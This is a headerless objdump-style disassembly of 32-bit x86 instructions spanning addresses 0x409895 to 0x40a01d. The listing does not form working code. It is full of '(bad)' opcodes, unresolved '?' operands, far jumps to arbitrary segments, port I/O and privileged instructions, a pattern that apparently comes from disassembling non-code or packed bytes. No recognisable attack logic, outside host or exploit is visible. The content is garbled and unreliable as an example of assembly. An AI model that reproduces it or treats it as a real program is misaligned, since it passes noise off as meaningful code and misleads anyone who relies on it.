  409895:	adc    ebp,DWORD PTR [eax-0x3e]
  409898:	int3   
  409899:	sar    dh,cl
  40989b:	inc    ch
  40989d:	jmp    0x409885
  40989f:	inc    edi
  4098a0:	je     0x4098bb
  4098a2:	jmp    FWORD PTR [eax+0x12]
  4098a5:	fdivr  QWORD PTR [edi]
  4098a7:	add    BYTE PTR [edi],ch
  4098a9:	fistp  WORD PTR [edx+0x29]
  4098ac:	mov    DWORD PTR [ebx],edx
  4098ae:	push   DWORD PTR [ebp-0x30]
  4098b1:	or     edx,DWORD PTR [eax+0x68189ffd]
  4098b7:	retf   0xd34c
  4098ba:	(bad)  
  4098bb:	mov    dl,BYTE PTR [bp+di]
  4098be:	add    BYTE PTR [eax-0x17f96181],al
  4098c4:	(bad)  
  4098c5:	push   ss
  4098c6:	(bad)  
  4098c7:	jmp    eax
  4098c9:	xor    eax,0x8b88413c
  4098ce:	add    BYTE PTR [eax],al
  4098d0:	add    BYTE PTR [eax],al
  4098d2:	mov    BYTE PTR [ebx+0xb5075fe],dl
  4098d8:	pop    ebx
  4098d9:	dec    BYTE PTR [edi+0x7d1e6818]
  4098df:	sar    dh,cl
  4098e1:	addr16 xor ebx,edi
  4098e4:	add    al,BYTE PTR [eax]
  4098e6:	mov    cl,0x9e
  4098e8:	lea    eax,[edi]
  4098ea:	pop    ecx
  4098eb:	and    al,0x6
  4098ed:	(bad)  
  4098ee:	outs   dx,BYTE PTR ds:[esi]
  4098f0:	mov    ?,ebx
  4098f2:	ss lock cli 
  4098f5:	out    0x86,eax
  4098f7:	push   ecx
  4098f8:	add    al,0xff
  4098fa:	clc    
  4098fb:	cmp    bh,bh
  4098fd:	inc    DWORD PTR [ebp-0x6300e89e]
  409903:	stc    
  409904:	sbb    bl,BYTE PTR [ecx]
  409906:	mov    ds:0xf10b045d,al
  40990b:	mov    al,0xc9
  40990d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40990f:	out    dx,eax
  409910:	sar    edi,0x66
  409913:	push   ebp
  409914:	push   ebp
  409915:	xchg   edx,eax
  409916:	out    dx,al
  409917:	cmp    eax,0xfd594fb3
  40991c:	add    ch,bh
  40991e:	lahf   
  40991f:	test   BYTE PTR [eax-0x4d028fc4],cl
  409925:	inc    BYTE PTR [ebp+esi*8+0x1a]
  409929:	jne    0x4098ad
  40992b:	adc    eax,0xfc495804
  409930:	add    ch,bh
  409932:	ja     0x4098c8
  409934:	jns    0x409973
  409936:	add    BYTE PTR [eax],al
  409938:	lock cld 
  40993a:	mov    dl,0xfe
  40993c:	sbb    al,0xe5
  40993e:	jmp    0xa4e8:0x2cde260
  409945:	jbe    0x40994a
  409947:	(bad)  
  409948:	js     0x409904
  40994a:	or     eax,DWORD PTR [eax]
  40994c:	fsub   QWORD PTR [ecx-0x10]
  40994f:	xor    BYTE PTR [ebp-0x50],0x6d
  409953:	add    BYTE PTR [ebx],cl
  409955:	sbb    al,BYTE PTR [ebx]
  409957:	jne    0x409992
  409959:	aad    0xb2
  40995b:	mov    ah,BYTE PTR [esi+0x13]
  40995e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40995f:	(bad)  
  409960:	cmc    
  409961:	out    dx,eax
  409962:	adc    bl,BYTE PTR [esi]
  409964:	push   esi
  409965:	push   0xeea5ebe1
  40996a:	lea    eax,[ebx]
  40996c:	(bad)  [edx]
  40996e:	xchg   BYTE PTR [ecx+0x29],bh
  409971:	cld    
  409972:	jno    0x409977
  409974:	ss out dx,al
  409976:	add    ah,BYTE PTR [eax]
  409978:	cs push 0xedb1ebe1
  40997e:	add    ebx,DWORD PTR gs:[esi]
  409981:	push   0x1c9c035d
  409986:	inc    ecx
  409987:	int    0xbb
  409989:	in     eax,dx
  40998a:	dec    ebp
  40998b:	int    0xf0
  40998d:	sbb    cl,ch
  40998f:	pop    eax
  409990:	stos   BYTE PTR es:[edi],al
  409991:	add    BYTE PTR [edx-0x9bcd236],bl
  409997:	inc    esp
  409998:	xor    DWORD PTR [ecx+ebp*8],edx
  40999b:	add    eax,DWORD PTR [eax]
  40999d:	add    BYTE PTR [ecx],dh
  40999f:	cmp    DWORD PTR [edx+0x3],eax
  4099a2:	fs sbb al,0x11
  4099a5:	aaa    
  4099a6:	jbe    0x4099bc
  4099a8:	jmp    0x6a5cff3b
  4099ad:	cld    
  4099ae:	xor    BYTE PTR [esi-0x28],ah
  4099b1:	push   es
  4099b2:	loope  0x409945
  4099b4:	adc    al,BYTE PTR [esi]
  4099b6:	dec    edi
  4099b7:	xchg   ebx,eax
  4099b8:	mov    dl,0x5f
  4099ba:	or     eax,0x6e69e467
  4099bf:	adc    al,BYTE PTR [ebp+0x4]
  4099c2:	sahf   
  4099c3:	addr16 in eax,dx
  4099c5:	jmp    0x409a33
  4099c7:	dec    ebp
  4099c8:	jmp    0xf66b2d0
  4099cd:	inc    ebp
  4099ce:	xor    DWORD PTR [edi+ecx*4+0x40],edi
  4099d2:	lock adc edx,ecx
  4099d5:	cdq    
  4099d6:	sahf   
  4099d7:	in     eax,dx
  4099d8:	push   DWORD PTR [ebp+0x4473d43f]
  4099de:	xor    ah,BYTE PTR [edi+0x8]
  4099e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099e2:	cmp    DWORD PTR [esi],esp
  4099e4:	sub    BYTE PTR ds:0x3fedc391,ch
  4099eb:	aam    0x74
  4099ed:	xor    al,0x32
  4099ef:	pop    es
  4099f0:	inc    esi
  4099f1:	(bad)  
  4099f2:	cmc    
  4099f3:	adc    esp,DWORD PTR [ebx+0x52f218]
  4099f9:	push   0x71
  4099fb:	inc    ebx
  4099fc:	aas    
  4099fd:	sub    BYTE PTR ds:0xf17514,ch
  409a03:	add    BYTE PTR [ebx],dh
  409a05:	pop    es
  409a06:	cmp    bl,BYTE PTR [edi]
  409a08:	ins    BYTE PTR es:[edi],dx
  409a09:	adc    al,0xeb
  409a0b:	adc    BYTE PTR [edi+0x33e86a14],bl
  409a11:	daa    
  409a12:	push   ecx
  409a13:	push   es
  409a14:	je     0x409a2a
  409a16:	call   esp
  409a18:	fs cs inc ecx
  409a1b:	jmp    0xe24c6ad7
  409a20:	repnz pusha 
  409a22:	and    DWORD PTR [esi],esp
  409a24:	sbb    DWORD PTR [ebx+0x3f],eax
  409a27:	test   al,0x32
  409a29:	in     eax,dx
  409a2a:	adc    al,0xbb
  409a2c:	jo     0x409a81
  409a2e:	add    BYTE PTR [edx-0x12],ch
  409a31:	adc    bh,bh
  409a33:	fdiv   st(4),st
  409a35:	sub    eax,0x17ebe941
  409a3a:	push   ecx
  409a3b:	mov    dh,0xf5
  409a3d:	adc    eax,DWORD PTR [eax]
  409a3f:	jmp    0xe92bae76
  409a44:	cmc    
  409a45:	cwde   
  409a46:	ret    0x6a42
  409a49:	rol    BYTE PTR [edi],cl
  409a4b:	jmp    0xe91ca05
  409a50:	repnz adc eax,DWORD PTR [eax]
  409a53:	add    BYTE PTR [ebx+esi*1],bh
  409a56:	push   DWORD PTR ds:0x415319
  409a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a5d:	add    al,0x52
  409a5f:	sbb    DWORD PTR ds:[eax],ebx
  409a62:	add    esp,0x4c
  409a65:	adc    edx,DWORD PTR ds:0x7600003a
  409a6b:	push   ecx
  409a6c:	add    bh,al
  409a6e:	pop    ebp
  409a6f:	inc    ecx
  409a70:	aas    
  409a71:	inc    ecx
  409a72:	pop    eax
  409a73:	adc    BYTE PTR [eax],al
  409a75:	add    BYTE PTR [eax-0x29],cl
  409a78:	push   ebx
  409a79:	mov    esp,DWORD PTR [esi+edx*4-0x66b40f3e]
  409a80:	inc    ebx
  409a81:	or     BYTE PTR [ebx],dl
  409a83:	fdiv   DWORD PTR [edx+0xb]
  409a86:	mov    ebp,DWORD PTR [ebx+0xc]
  409a89:	add    ah,bh
  409a8b:	adc    al,BYTE PTR [eax+0x7631838]
  409a91:	sub    ebx,DWORD PTR [eax+0x49]
  409a94:	leave  
  409a95:	ret    0x1800
  409a98:	cmp    BYTE PTR [eax],0xb6
  409a9b:	arpl   WORD PTR [eax],dx
  409a9d:	and    ebp,0x46
  409aa0:	aas    
  409aa1:	inc    ecx
  409aa2:	fcom   DWORD PTR [edi]
  409aa4:	jne    0x409aad
  409aa6:	add    ebx,eax
  409aa8:	pop    ecx
  409aa9:	leave  
  409aaa:	or     bl,BYTE PTR [eax]
  409aac:	add    BYTE PTR [eax+0x3e7495e0],al
  409ab2:	push   ebx
  409ab3:	inc    ebx
  409ab4:	or     al,0x4a
  409ab6:	dec    ebx
  409ab7:	repnz add DWORD PTR [ebx],ecx
  409aba:	sbb    ah,BYTE PTR [ebx+0x6]
  409abd:	and    DWORD PTR ds:0x8c75011b,0x38
  409ac4:	shr    bl,0x2c
  409ac7:	adc    eax,0x52230c4d
  409acc:	or     al,0x5
  409ace:	add    BYTE PTR [eax],al
  409ad0:	xor    ebp,edi
  409ad2:	push   es
  409ad3:	add    BYTE PTR [ecx],dh
  409ad5:	mov    esp,0xc4e101e2
  409ada:	sbb    al,0x8d
  409adc:	jbe    0x409a88
  409ade:	push   edx
  409adf:	mov    eax,DWORD PTR [esi*8+0x20665044]
  409ae6:	adc    BYTE PTR [edx+0x49],dl
  409ae9:	test   al,0x9a
  409aeb:	(bad)  
  409aec:	push   esi
  409aed:	push   ebp
  409aee:	pop    ebp
  409aef:	leave  
  409af0:	jae    0x409ae7
  409af2:	add    ch,BYTE PTR [ebx]
  409af4:	push   0xffffff9a
  409af6:	jne    0x409b04
  409af8:	ds call 0x7720508
  409afe:	add    al,0xff
  409b00:	inc    esp
  409b01:	mov    ds:0x7e314140,eax
  409b06:	(bad)  
  409b07:	cvtpi2ps xmm7,QWORD PTR ds:0xafa86577
  409b0e:	(bad)  
  409b0f:	imul   edi,DWORD PTR ds:0x61f04670,0xfe8bf655
  409b19:	push   ecx
  409b1a:	ins    DWORD PTR es:[edi],dx
  409b1b:	add    BYTE PTR [edi+ebp*4-0x5811b00e],ah
  409b22:	(bad)  
  409b23:	(bad)  
  409b24:	cmp    al,0x8b
  409b26:	inc    eax
  409b27:	inc    ecx
  409b28:	xor    DWORD PTR [esi-0x39],edi
  409b2b:	or     ebp,DWORD PTR [edx]
  409b2d:	cmp    eax,0xb7bc3376
  409b32:	repnz add BYTE PTR [eax],0x0
  409b36:	dec    ecx
  409b37:	icebp  
  409b38:	add    dh,BYTE PTR [edx+ebx*1+0x66]
  409b3c:	inc    ebx
  409b3d:	or     BYTE PTR [ecx-0x73],dh
  409b40:	jmp    0x898a:0xfee1bdb4
  409b47:	inc    edi
  409b48:	inc    esi
  409b49:	lock sahf 
  409b4b:	adc    ebx,DWORD PTR [ecx+0xc]
  409b4e:	add    ch,bl
  409b50:	pop    eax
  409b51:	or     BYTE PTR [ecx-0x78009b32],bl
  409b57:	jge    0x409b42
  409b59:	nop
  409b5a:	cmc    
  409b5b:	jecxz  0x409b75
  409b5d:	call   FWORD PTR ds:0x3144ff56
  409b63:	xchg   edi,eax
  409b64:	lods   al,BYTE PTR ds:[esi]
  409b65:	or     al,0xdb
  409b67:	adc    al,0xae
  409b69:	jns    0x409bc8
  409b6b:	jmp    0x82e9:0x551741fb
  409b72:	jb     0x409b8f
  409b74:	(bad)  
  409b76:	jmp    0x409b54
  409b78:	stos   BYTE PTR es:[edi],al
  409b79:	or     al,0x31
  409b7b:	inc    ecx
  409b7c:	jb     0x409b6e
  409b7e:	aaa    
  409b7f:	pusha  
  409b80:	in     eax,dx
  409b81:	(bad)  
  409b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b83:	sbb    al,0x76
  409b85:	sbb    DWORD PTR [eax+0x29],edi
  409b88:	sub    BYTE PTR [edx+esi*4],al
  409b8b:	shl    al,1
  409b8d:	push   ebx
  409b8e:	push   ss
  409b8f:	pusha  
  409b90:	in     eax,dx
  409b91:	inc    BYTE PTR [ebp+0x6c19561c]
  409b97:	sub    DWORD PTR [eax-0x4dfffffd],ebp
  409b9d:	shl    al,1
  409b9f:	mov    bl,BYTE PTR [ebp+0x4]
  409ba2:	jo     0x409ba6
  409ba4:	mov    ebx,ebx
  409ba6:	sub    dl,BYTE PTR [eax]
  409ba8:	xor    DWORD PTR [edi],edi
  409baa:	(bad)  
  409bab:	lock mov bl,0xd0
  409bae:	adc    bh,bh
  409bb0:	pop    ebp
  409bb1:	sbb    BYTE PTR [ecx],dl
  409bb3:	add    esp,DWORD PTR [eax-0xef4ea17]
  409bb9:	pop    edi
  409bba:	in     eax,0xcc
  409bbc:	lock add al,0xe9
  409bbf:	(bad)  
  409bc0:	cmp    eax,0xdce01118
  409bc5:	jmp    0xd47c91c9
  409bca:	jae    0x409bb1
  409bcc:	ins    DWORD PTR es:[edi],dx
  409bcd:	ror    DWORD PTR [edi],cl
  409bcf:	jmp    0xde54fc6b
  409bd4:	or     DWORD PTR [eax+ebp*8],eax
  409bd7:	lods   al,BYTE PTR ds:[esi]
  409bd8:	xor    ecx,ebp
  409bda:	(bad)  
  409bdb:	loop   0x409c4f
  409bdd:	pusha  
  409bde:	add    al,0xb0
  409be0:	jo     0x409bfb
  409be2:	add    BYTE PTR [ecx+0x28],dl
  409be5:	sub    DWORD PTR [ecx-0x17],eax
  409be8:	fcmove st,st(7)
  409bea:	cmp    eax,0x8bfc3528
  409bef:	jg     0x409c48
  409bf1:	jmp    0xdc68:0x18c9a90a
  409bf8:	pop    es
  409bf9:	push   ebx
  409bfa:	add    BYTE PTR [ecx],al
  409bfc:	out    0x29,eax
  409bfe:	inc    ecx
  409bff:	jmp    0x6c8a9c04
  409c04:	xchg   esi,eax
  409c05:	jle    0x409c36
  409c07:	push   ds
  409c08:	shl    dh,0xae
  409c0b:	mov    ecx,0x9732e900
  409c10:	inc    esp
  409c11:	gs sub cl,0x74
  409c15:	in     eax,dx
  409c16:	(bad)  
  409c18:	xor    eax,0x83146c16
  409c1d:	and    eax,0xf6c01d2a
  409c22:	test   eax,0x32e90081
  409c27:	jle    0x409c29
  409c29:	fs jns 0x409c18
  409c2c:	dec    edi
  409c2d:	ret    
  409c2e:	fbstp  TBYTE PTR [eax-0x3b]
  409c31:	out    0x6d,al
  409c33:	adc    al,0xff
  409c35:	xchg   esp,eax
  409c36:	into   
  409c37:	jmp    0x53487050
  409c3c:	add    BYTE PTR [edx-0xa],ch
  409c3f:	add    al,0xb
  409c41:	add    BYTE PTR [eax],cl
  409c43:	sbb    al,BYTE PTR [ebp+0x14996a]
  409c49:	jmp    DWORD PTR ds:0xc915fded
  409c4f:	sub    DWORD PTR [ecx+0x0],eax
  409c52:	or     ebx,esp
  409c54:	add    al,BYTE PTR [ebx+0x5747b90]
  409c5a:	jno    0x409ca7
  409c5c:	add    DWORD PTR [eax],eax
  409c5e:	mov    BYTE PTR [ecx+0x7e18f443],bl
  409c64:	add    bh,bh
  409c66:	add    BYTE PTR [eax],al
  409c68:	and    eax,0x9f14e6e8
  409c6d:	out    0xfd,al
  409c6f:	or     ecx,DWORD PTR [eax+0x49398416]
  409c75:	adc    al,0x0
  409c77:	sub    DWORD PTR ds:0xd40efeec,0x36
  409c7e:	add    DWORD PTR [eax],eax
  409c80:	dec    eax
  409c81:	xchg   esp,eax
  409c82:	add    BYTE PTR ss:[edi],bh
  409c85:	nop
  409c86:	and    al,0x1
  409c88:	sbb    BYTE PTR [eax+edx*2],dl
  409c8b:	mov    eax,DWORD PTR [ebp-0x14]
  409c8e:	inc    eax
  409c8f:	push   edx
  409c90:	mov    al,0x76
  409c92:	mov    edi,edi
  409c94:	(bad)
  409c98:	pusha  
  409c99:	jmp    0x5fa09111
  409c9e:	call   0x89c00cf5
  409ca3:	jmp    FWORD PTR [edi-0x2f]
  409ca6:	inc    ebx
  409ca7:	lock fcom DWORD PTR [ebx]
  409caa:	add    BYTE PTR [eax],al
  409cac:	pop    ss
  409cad:	dec    edi
  409cae:	in     al,dx
  409caf:	add    al,cl
  409cb1:	adc    eax,DWORD PTR [eax]
  409cb3:	or     ebp,0x56
  409cb6:	aas    
  409cb7:	inc    ecx
  409cb8:	fcom   DWORD PTR [ebx]
  409cba:	jne    0x409d0e
  409cbc:	xor    DWORD PTR [ebp-0x28fbfc8],edx
  409cc2:	jmp    0x1950:0x2fd5529
  409cc9:	rol    DWORD PTR [edx+0x41],cl
  409ccc:	add    BYTE PTR [eax],al
  409cce:	xor    esi,ebx
  409cd0:	jne    0x409cba
  409cd2:	mov    DWORD PTR [ecx],ecx
  409cd4:	pop    edi
  409cd5:	add    BYTE PTR [ecx],dh
  409cd7:	loop   0x409c9b
  409cd9:	jae    0x409d04
  409cdb:	inc    ebp
  409cdc:	inc    ebx
  409cdd:	inc    eax
  409cde:	lock cld 
  409ce0:	jmp    0x950:0x2fcdd0d
  409ce7:	cmp    al,0x44
  409ce9:	inc    ecx
  409cea:	xor    DWORD PTR [esi+0x6d59e875],esp
  409cf0:	pop    esi
  409cf1:	add    BYTE PTR [ecx],dh
  409cf3:	bnd ret 0x2373
  409cf7:	add    eax,0xfcf0404b
  409cfc:	jmp    0xc950:0x2fceaf1
  409d03:	xor    eax,DWORD PTR [ecx+eax*2+0x31]
  409d07:	mov    ?,WORD PTR [ebp-0x18]
  409d0a:	sbb    DWORD PTR [ecx+0x5e],eax
  409d0d:	add    BYTE PTR [ecx],dh
  409d0f:	xchg   edx,eax
  409d10:	sbb    ch,BYTE PTR [eax-0x7d]
  409d13:	cmp    eax,0x55090043
  409d18:	pop    eax
  409d19:	add    BYTE PTR [ecx],dh
  409d1b:	lods   eax,DWORD PTR ds:[esi]
  409d1c:	push   0x52
  409d1e:	jno    0x409cdc
  409d20:	add    bh,bh
  409d22:	test   BYTE PTR [ebp-0x15],dl
  409d25:	jns    0x409d7b
  409d27:	std    
  409d28:	add    cl,BYTE PTR [ebx]
  409d2a:	icebp  
  409d2b:	lahf   
  409d2c:	ins    BYTE PTR es:[edi],dx
  409d2d:	lea    ebp,[ecx+ebp*1+0x53]
  409d31:	push   0x0
  409d33:	add    BYTE PTR [eax],dh
  409d35:	ss jbe 0x409d30
  409d38:	leave  
  409d39:	adc    esi,DWORD PTR [edx+0x1de6cffd]
  409d3f:	jbe    0x409cfe
  409d41:	inc    ebx
  409d42:	add    DWORD PTR [esi-0x44],eax
  409d45:	out    0xd,al
  409d47:	mov    ch,BYTE PTR [ebp-0x1c]
  409d4a:	jae    0x409d92
  409d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d4d:	inc    ebx
  409d4e:	xchg   ebx,eax
  409d4f:	add    DWORD PTR [esi+0x61eaf160],esp
  409d55:	out    0xed,al
  409d57:	sti    
  409d58:	xchg   edi,eax
  409d59:	pusha  
  409d5a:	fst    QWORD PTR [ecx+ebx*4+0x3a]
  409d5e:	fdiv   st(3),st
  409d60:	xchg   DWORD PTR [ebx+ebp*1-0x3e974c18],ebx
  409d67:	add    al,0xfd
  409d69:	pop    ds
  409d6a:	push   0x79
  409d6c:	pop    ebp
  409d6d:	adc    esi,DWORD PTR ds:0xe913d92a
  409d73:	jmp    0xe549:0xc33e69c
  409d7a:	outs   dx,BYTE PTR ds:[esi]
  409d7b:	sti    
  409d7c:	dec    edi
  409d7d:	out    0x13,al
  409d7f:	in     al,dx
  409d80:	inc    edi
  409d81:	pusha  
  409d82:	loope  0x409d6f
  409d84:	in     eax,0x8e
  409d86:	(bad)  
  409d87:	sti    
  409d88:	aaa    
  409d89:	pusha  
  409d8a:	jns    0x409d87
  409d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d8d:	sbb    al,0x91
  409d8f:	dec    esi
  409d90:	scas   al,BYTE PTR es:[edi]
  409d91:	in     eax,0x75
  409d93:	sti    
  409d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d95:	clc    
  409d96:	ins    DWORD PTR es:[edi],dx
  409d97:	jno    0x409d99
  409d99:	add    BYTE PTR [ecx],ch
  409d9b:	cld    
  409d9c:	and    eax,0x5de60f83
  409da1:	jno    0x409da4
  409da3:	std    
  409da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409da5:	(bad)  
  409da6:	jmp    ebp
  409da8:	dec    ebp
  409da9:	jno    0x409db0
  409dab:	std    
  409dac:	lods   al,BYTE PTR ds:[esi]
  409dad:	(bad)  
  409dae:	out    dx,eax
  409daf:	in     eax,0x3d
  409db1:	jno    0x409d8c
  409db3:	cld    
  409db4:	push   esp
  409db6:	lods   al,BYTE PTR ds:[esi]
  409db7:	out    0xfe,al
  409db9:	inc    eax
  409dba:	ret    
  409dbb:	out    0xfe,eax
  409dbd:	es retf 0xfc60
  409dc1:	push   ds
  409dc2:	and    BYTE PTR [ebx],ch
  409dc4:	aas    
  409dc5:	test   al,0x32
  409dc7:	xchg   ecx,eax
  409dc8:	ret    
  409dc9:	in     eax,0xca
  409dcb:	jle    0x409dc8
  409dcd:	push   es
  409dce:	stos   BYTE PTR es:[edi],al
  409dcf:	fadd   st(1),st
  409dd1:	fnstenv [edx]
  409dd3:	aas    
  409dd4:	mov    eax,DWORD PTR ds:0xee007a06
  409dda:	and    DWORD PTR [eax+ebp*8],ebx
  409ddd:	call   0x426a:0x72fee6b9
  409de4:	call   0x547de2
  409de9:	loop   0x409e5d
  409deb:	popa   
  409dec:	sbb    ebp,edx
  409dee:	ja     0x409e3d
  409df0:	jmp    0x409dcd
  409df2:	mov    dl,0x1d
  409df4:	or     eax,0x3794303d
  409df9:	jecxz  0x409ddc
  409dfb:	push   cs
  409dfc:	(bad)  
  409dfd:	jmp    0xf9729e02
  409e02:	add    DWORD PTR [edx-0x55c4a3cf],edx
  409e08:	(bad)  
  409e09:	stc    
  409e0a:	mov    ch,BYTE PTR [edx-0x123e2529]
  409e10:	xor    bh,BYTE PTR [edi]
  409e12:	mov    ecx,DWORD PTR [ebp+0x1eb3d0af]
  409e18:	sbb    ah,BYTE PTR [eax+0xc]
  409e1b:	add    edi,0x3f66fe96
  409e21:	aam    0x74
  409e23:	in     al,0x6b
  409e25:	fcmovnb st,st(1)
  409e27:	stc    
  409e28:	xor    ah,ch
  409e2a:	je     0x409e09
  409e2c:	or     dl,BYTE PTR [edx-0x1588ff55]
  409e32:	or     eax,eax
  409e34:	pushf  
  409e35:	adc    ebx,DWORD PTR [edi-0x37]
  409e38:	or     al,BYTE PTR [ecx]
  409e3a:	add    bh,bh
  409e3c:	popf   
  409e3d:	adc    al,0xff
  409e3f:	jne    0x409e09
  409e41:	clc    
  409e42:	imul   edi,ebx,0x458bea27
  409e48:	sbb    BYTE PTR [ecx-0x1],al
  409e4b:	jne    0x409e21
  409e4d:	clc    
  409e4e:	aas    
  409e4f:	(bad)  
  409e50:	aaa    
  409e51:	jmp    0x2fa:0x6497c009
  409e58:	mov    BYTE PTR [eax],dl
  409e5a:	push   DWORD PTR [ebp-0x7c]
  409e5d:	jmp    0xff92:0xcd60f873
  409e64:	add    BYTE PTR [eax],al
  409e66:	addr16 push ss
  409e68:	ror    BYTE PTR [edi],0xc
  409e6b:	retf   
  409e6c:	add    BYTE PTR [eax],al
  409e6e:	mov    BYTE PTR [ecx-0x181c13bd],bl
  409e74:	jle    0x409eb5
  409e76:	pop    eax
  409e77:	sbb    eax,DWORD PTR [ecx+ecx*8+0x5700104a]
  409e7e:	jo     0x409ed4
  409e80:	(bad)  
  409e81:	call   DWORD PTR [edi-0x582fbc68]
  409e87:	je     0x409e59
  409e89:	push   0x412ae1
  409e8e:	mov    al,0x4
  409e90:	pop    ebx
  409e91:	add    BYTE PTR [eax],bl
  409e93:	dec    eax
  409e94:	push   DWORD PTR [ebp-0x38]
  409e97:	jo     0x409e56
  409e99:	aas    
  409e9a:	dec    ecx
  409e9b:	sbb    al,ch
  409e9d:	pop    ss
  409e9e:	inc    ebx
  409e9f:	sbb    BYTE PTR [eax],al
  409ea1:	push   eax
  409ea2:	xchg   edi,eax
  409ea3:	jae    0x409e75
  409ea5:	push   0x411d59
  409eaa:	xor    DWORD PTR [ebp+0xb],edx
  409ead:	pop    ebx
  409eae:	xor    ebp,ebp
  409eb0:	pop    esp
  409eb1:	pop    ecx
  409eb2:	cmp    ch,BYTE PTR ds:0xff3a0c70
  409eb8:	outs   dx,DWORD PTR ds:[esi]
  409eb9:	or     BYTE PTR [edx],ch
  409ebb:	xor    al,0x9
  409ebd:	test   DWORD PTR [edi+ebp*8+0x2],edx
  409ec1:	add    BYTE PTR [edx],bh
  409ec3:	and    al,0x6f
  409ec5:	or     esi,ebp
  409ec7:	mov    eax,0xae
  409ecc:	xor    ebp,ebp
  409ece:	add    ch,bl
  409ed0:	cmp    bh,BYTE PTR cs:[edi]
  409ed3:	mov    ah,0x31
  409ed5:	in     eax,dx
  409ed6:	add    al,BYTE PTR [eax]
  409ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ed9:	sahf   
  409eda:	ret    0x9eb8
  409edd:	jmp    0x73c:0x23a3fef7
  409ee4:	add    al,0xed
  409ee6:	mov    edi,0x2ed9944
  409eeb:	add    BYTE PTR [ecx],dh
  409eed:	ins    DWORD PTR es:[edi],dx
  409eee:	cmp    BYTE PTR [eax],al
  409ef0:	es jns 0x409f3f
  409ef3:	add    dh,BYTE PTR [ecx]
  409ef5:	in     eax,dx
  409ef6:	dec    edi
  409ef7:	call   0xff384282
  409efc:	test   al,0x30
  409efe:	enter  0xd482,0xd4
  409f02:	add    dh,BYTE PTR [ebp+0x10]
  409f05:	add    eax,0xecf02bbb
  409f0a:	div    DWORD PTR [ebp+ebp*2-0x6b]
  409f0e:	test   eax,0xbed3159
  409f13:	sar    BYTE PTR [esi],0x70
  409f16:	push   es
  409f17:	add    dh,BYTE PTR [ecx]
  409f19:	in     eax,dx
  409f1a:	mov    edi,0x2ec0944
  409f1f:	add    BYTE PTR [ecx],dh
  409f21:	xchg   esp,eax
  409f22:	add    DWORD PTR [edx],eax
  409f24:	xor    DWORD PTR [ecx+ebp*8],edx
  409f27:	test   BYTE PTR [ebp+0x2e6ee7ec],al
  409f2d:	(bad)  
  409f2e:	rcr    edi,cl
  409f30:	add    BYTE PTR [eax],al
  409f32:	out    dx,eax
  409f33:	pop    eax
  409f34:	inc    ecx
  409f35:	add    eax,0xeae91431
  409f3a:	pushf  
  409f3b:	adc    al,0xe9
  409f3d:	add    esi,DWORD PTR [edx+0x5c054160]
  409f43:	adc    esp,DWORD PTR [eax+0x76]
  409f46:	rcr    edx,1
  409f48:	stos   DWORD PTR es:[edi],eax
  409f49:	jmp    0x409f7e
  409f4b:	adc    al,0xe9
  409f4d:	add    ecx,eax
  409f4f:	mov    ah,0xe7
  409f51:	add    esi,DWORD PTR [ecx]
  409f53:	xchg   edi,eax
  409f54:	mov    ebp,ebx
  409f56:	xor    ebp,DWORD PTR [ecx-0xa]
  409f59:	mov    ah,BYTE PTR ds:0x893e25c0
  409f5f:	pop    ss
  409f60:	jmp    0x5d2dd068
  409f65:	add    dh,BYTE PTR [ecx]
  409f67:	adc    al,0x6a
  409f69:	jns    0x409f04
  409f6b:	pop    ss
  409f6c:	push   esp
  409f6d:	pop    es
  409f6e:	test   al,0x60
  409f70:	mov    cl,0xbf
  409f72:	in     eax,dx
  409f73:	jmp    0x409f58
  409f75:	add    esi,DWORD PTR [ecx]
  409f77:	adc    al,0xd0
  409f79:	outs   dx,DWORD PTR ds:[esi]
  409f7a:	xor    BYTE PTR [ecx+ebp*8],dl
  409f7d:	sbb    ch,0xeb
  409f80:	jmp    0x409f88
  409f82:	lods   al,BYTE PTR ds:[esi]
  409f83:	jae    0x409f6d
  409f85:	add    esi,DWORD PTR [ecx]
  409f87:	lea    esp,[ebx]
  409f89:	shl    BYTE PTR [ebx-0x3afbaaa0],1
  409f8f:	or     al,0xae
  409f91:	inc    ecx
  409f92:	dec    ecx
  409f93:	adc    eax,0x3e9
  409f98:	xor    ebp,ebp
  409f9a:	in     eax,dx
  409f9b:	mov    esi,0x3e6ec6d
  409fa0:	xor    DWORD PTR [eax+eax*1],edx
  409fa3:	scas   al,BYTE PTR es:[edi]
  409fa4:	jo     0x409f7a
  409fa6:	(bad)  
  409fa7:	call   0xad07b3de
  409fac:	cli    
  409fad:	loope  0x409fad
  409faf:	jmp    0x2d8578e6
  409fb4:	sub    eax,0xafe90014
  409fb9:	pop    eax
  409fba:	mov    esp,0x1432e9
  409fbf:	es jo  0x409f5e
  409fc2:	(bad)  
  409fc3:	call   0xb53fb3fa
  409fc8:	out    dx,al
  409fc9:	stc    
  409fca:	adc    ah,BYTE PTR [edi]
  409fcc:	mov    esi,0xf2a488e2
  409fd1:	loop   0x40a047
  409fd3:	xor    eax,0xefe19c5
  409fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fd9:	mov    WORD PTR [ecx+esi*1-0x62],es
  409fdd:	push   0xe09811d4
  409fe2:	(bad)  
  409fe3:	mul    BYTE PTR [ebp+0x486ac458]
  409fe9:	dec    edi
  409fea:	aas    
  409feb:	sub    BYTE PTR ds:0xd3b7514,ch
  409ff1:	push   ds
  409ff2:	inc    eax
  409ff3:	sub    BYTE PTR ds:0x35300cec,ch
  409ff9:	adc    al,0x50
  409ffb:	push   ecx
  409ffc:	add    BYTE PTR [eax],al
  409ffe:	sub    edx,DWORD PTR [ecx+eax*2-0x17]
  40a002:	addr16 push 0x3b8fc1c0
  40a008:	add    cl,ch
  40a00a:	cmp    edx,esp
  40a00c:	jae    0x40a00f
  40a00e:	aad    0x52
  40a010:	inc    eax
  40a011:	sub    BYTE PTR ds:0x2d31f0ec,dh
  40a017:	adc    al,0x50
  40a019:	add    DWORD PTR [esp+edx*2+0x41],esi
  40a01d:	add    BYTE PTR [eax],bl
